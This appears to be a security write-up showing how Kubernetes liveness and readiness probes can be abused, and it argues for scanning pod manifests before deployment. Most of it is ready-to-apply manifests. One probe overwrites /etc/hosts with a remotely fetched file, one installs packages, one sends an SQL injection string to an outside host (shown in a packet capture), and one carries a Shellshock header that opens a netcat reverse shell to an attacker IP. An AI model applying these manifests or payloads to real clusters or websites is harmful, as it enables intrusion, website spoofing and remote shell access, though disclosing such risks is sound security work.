## Exploiting applications using livenessProbes in Kubernetes
### Introduction
Startup, readiness, and liveness probes are very well described in the Kubernetes documentation. <br>
Kubelet uses these probes defined in the pod manifest to verify whether a pod is booting, ready to accept traffic and still alive.<br>
<br>
It is `kubelet` who actually executes the probes (and not the pod itself). <br>

There are different ways the probes are executed. <br>
- httpGet <br>
- exec <br>

The problems described here are considered 'as designed', as you should download containers from a trusted source according to the reviewers. <br>
The examples below shows that trusted sources of container images will not solve the problem, neither will image scanning. <br><br>
To prevent an attack from happening, it is mandatory to scan the Kubernetes pod and deployment manifests rigorously before deploying. <br>

### Examples1: Overwriting files on the pod filesystem - spoofing websites
```
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  labels:
    test: liveness
  name: liveness-exec15
spec:
  containers:
  - name: liveness
    image: xxradar/hackon
    args:
    - /bin/sh
    - -c
    - touch /tmp/healthy;sleep 600
    livenessProbe:
      exec:
        command:
        - curl
        - www.xxxxx.com/host.txt
        - -o 
        - /etc/hosts
      initialDelaySeconds: 5
      periodSeconds: 5
EOF
```
### Examples2: Installing applications the pod at deployment 
```
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  labels:
    test: liveness
  name: liveness-exec39
spec:
  containers:
  - name: liveness
    image: ubuntu
    args:
    - /bin/sh
    - -c
    - touch /tmp/healthy;sleep 600
    readinessProbe:
      exec:
        command:
        - apt-get 
        - update
      initialDelaySeconds: 5
      periodSeconds: 10
      timeoutSeconds: 60
    livenessProbe:
      exec:
        command:
        - apt-get 
        - install
        - -y
        - curl
      initialDelaySeconds: 60
      periodSeconds: 100
      timeoutSeconds: 60
EOF
```
### Examples3: Attacking http(s) endpoints using sql injection, XXS, ... 

```
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  labels:
    test: liveness
  name: liveness3
spec:
  containers:
  - name: liveness
    image: ubuntu
    args:
    - /bin/sh
    - -c
    - touch /tmp/healthy;sleep 600
    livenessProbe:
      httpGet:
        host: www.xxxx.com
        path: /?'OR 1=1--
        port: 8080
        httpHeaders:
          - name: User-Agent
            value: xxxxxxxxx
EOF
```
```
22:03:04.693794 IP 192.168.0.131.50723 > 198.199.124.250.http-alt: Flags [P.], seq 1:116, ack 1, win 2053, options [nop,nop,TS val 2487114541 ecr 6590553], length 115: HTTP: GET /?'OR 1=1-- HTTP/1.1
  0x0000:  ac22 058e 607c 3c22 fb51 bf41 0800 4500  ."..`|<".Q.A..E.
  0x0010:  00a7 0000 4000 4006 3564 c0a8 0083 c6c7  ....@.@.5d......
  0x0020:  7cfa c623 1f90 8580 94d6 96d2 2b3d 8018  |..#........+=..
  0x0030:  0805 c39c 0000 0101 080a 943e 5b2d 0064  ...........>[-.d
  0x0040:  9059 4745 5420 2f3f 274f 5220 313d 312d  .YGET./?'OR.1=1-
  0x0050:  2d20 4854 5450 2f31 2e31 0d0a 486f 7374  -.HTTP/1.1..Host
  0x0060:  3a20 7777 772e 7261 6461 7268 6163 6b2e  :.www.radarhack.
  0x0070:  636f 6d3a 3830 3830 0d0a 5573 6572 2d41  com:8080..User-A
  0x0080:  6765 6e74 3a20 4d79 5573 6572 4167 656e  gent:.MyUserAgen
  0x0090:  740d 0a41 6363 6570 743a 202a 2f2a 0d0a  t..Accept:.*/*..
  0x00a0:  436f 6e6e 6563 7469 6f6e 3a20 636c 6f73  Connection:.clos
```
### Examples4 : Attacking http(s) endpoints using shellshock
```
apiVersion: v1
kind: Pod
metadata:
   name: radarhack-pod3
   labels:
      pod: radarhack
spec:
  containers:
  - name: radarhack
    image: docker.io/xxradar/naxsi5
    ports:
    - containerPort: 80
    livenessProbe:
      httpGet:
        host: www.radarhack.com
        path: /index.html?test=' or 1=1--
        port: 8080
        httpHeaders:
        - name: Custom-Header
          value: Awesome
        - name: X-Frame-Options
          value: () { :;};echo;/bin/nc -e /bin/bash 192.168.81.128 443
      initialDelaySeconds: 3
      periodSeconds: 3
 ```

### Conclusion
Many things are written on securely deploying applications on kubernetes. Keep in mind that all aspects need full attention. Generating and building Kubernetes manifest is also developping code.
